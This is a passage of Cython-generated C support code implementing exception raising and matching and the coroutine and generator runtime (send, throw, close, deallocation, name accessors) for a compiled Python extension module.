        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* RaiseException */
    #if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb,
                        CYTHON_UNUSED PyObject *cause) {
    __Pyx_PyThreadState_declare
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#else
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* CoroutineBase */
    #include <structmember.h>
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (Py_TYPE(ev) == (PyTypeObject*)PyExc_StopIteration) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(CYTHON_UNUSED __pyx_CoroutineObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(CYTHON_UNUSED PyObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(CYTHON_UNUSED PyObject *gen, PyObject *value, CYTHON_UNUSED int closing) {
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_type) {
        #if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
        #else
        if (exc_state->exc_traceback) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_state->exc_traceback;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body((PyObject *) self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *exc_tb = exc_state->exc_traceback;
    if (likely(exc_tb)) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
#else
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
#endif
    }
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(CYTHON_UNUSED PyObject* gen, PyObject *retval) {
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
            _PyGen_SetStopIterationValue(result);
        }
        Py_CLEAR(result);
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = Py_TYPE(yf)->tp_iternext(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                PyErr_WriteUnraisable(yf);
            }
            PyErr_Clear();
        } else {
            retval = PyObject_CallFunction(meth, NULL);
            Py_DECREF(meth);
            if (!retval)
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = Py_TYPE(yf)->tp_iternext(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, CYTHON_UNUSED PyObject *arg) {
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                    gen->is_running = 0;
                    return NULL;
                }
                PyErr_Clear();
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = PyObject_CallObject(meth, args);
            } else {
                ret = PyObject_CallFunctionObjArgs(meth, typ, val, tb, NULL);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (PyObject_CallFinalizerFromDealloc(self))
#else
        Py_TYPE(gen)->tp_del(self);
        if (Py_REFCNT(self) > 0)
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    PyObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (--self->ob_refcnt == 0) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_name;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_name;
    Py_INCREF(value);
    self->gi_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_qualname;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_qualname;
    Py_INCREF(value);
    self->gi_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *frame = self->gi_frame;
